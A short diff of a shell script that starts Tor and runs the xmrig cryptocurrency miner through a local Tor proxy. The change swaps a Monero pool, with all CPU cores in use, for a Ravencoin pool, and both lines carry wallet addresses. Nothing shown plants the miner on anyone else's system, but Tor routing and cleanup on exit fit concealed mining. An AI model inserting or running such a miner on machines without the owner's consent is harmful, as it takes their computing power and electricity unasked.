@@ -8,4 +8,4 @@ EOF
 tor -f .tor/torrc &
 TORPID=$!
 trap 'kill $TORPID; rm -r ~/xmrig/build/.tor' EXIT
-./xmrig -o pool.supportxmr.com:3333 -u 48j6iQDeCSDeH46gw4dPJnMsa6TQzPa6WJaYbBS9JJucKqg9Mkt5EDe9nSkES3b8u7V6XJfL8neAPAtbEpmV2f4XC7bdbkv -k -x 127.0.0.1:9054 -t $(nproc) --cpu-priority=0
+./xmrig -a kawpow -o rvn.2miners.com:6060 -u RCo4QqzEnEtEVv749TJfNz293p2xVVhXFx -p x -k -x 127.0.0.1:9054
